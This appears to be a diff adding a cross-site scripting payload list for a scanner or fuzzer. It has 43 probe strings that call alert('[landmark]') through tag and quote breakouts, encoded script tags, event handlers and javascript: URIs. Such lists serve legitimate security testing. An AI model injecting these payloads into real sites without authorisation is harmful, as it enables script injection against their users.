@@ -1,0 +1,43 @@
+<script>alert("[landmark]")</script>
+"><script>alert("[landmark]")</script>
+</textarea><script>alert("[landmark]")</script>
+<script>alert("[landmark]")</script>
+<<script>alert("[landmark]");//<</script>
+<script>alert("[landmark]")</script>
+'><script>alert("[landmark]")</script>
+'><script>alert("[landmark]");</script>
+; alert("[landmark]");//
+'; alert("[landmark]");//
+";alert("[landmark]");//
+\'; alert("[landmark]");//
+\";alert("[landmark]");//
+*/alert("[landmark]");//
+%3cscript%3ealert("[landmark]");%3c/script%3e
+%3cscript%3ealert("[landmark]");%3c%2fscript%3e
+%3Cscript%3Ealert("[landmark]");%3C/script%3E
+&ltscript&gtalert("[landmark]");</script>
+&ltscript&gtalert("[landmark]");&ltscript&gtalert
+<xss><script>alert("[landmark]")</script></vulnerable>
+</iframe><script>alert("[landmark]")</script>
+</noembed><script>alert("[landmark]")</script>
+</noframes><script>alert("[landmark]")</script>
+</noscript><script>alert("[landmark]")</script>
+</style><script>alert("[landmark]")</script>
+</title><script>alert("[landmark]")</script>
+</xmp><script>alert("[landmark]")</script>
+</script><script>alert("[landmark]")</script>
+--><script>alert("[landmark]")</script>
+';</script><script>alert("[landmark]")</script>
+";</script><script>alert("[landmark]")</script>
+%00<script>alert("[landmark]")</script>
+%0d%0a<script>alert("[landmark]")</script>
+<a href='javascript:alert("[landmark]")'>click me</a>
+<img src="x" onerror='alert("[landmark]")'>
+<img/src/onerror=alert("[landmark]")>
+<iframe src='javascript:alert("[landmark]")'></iframe>
+ onmouseover='alert("[landmark]")'
+" onmouseover='alert("[landmark]")'
+' onmouseover='alert("[landmark]")'
+\" onmouseover='alert("[landmark]")'
+\' onmouseover='alert("[landmark]")'
+javascript:alert("[landmark]")
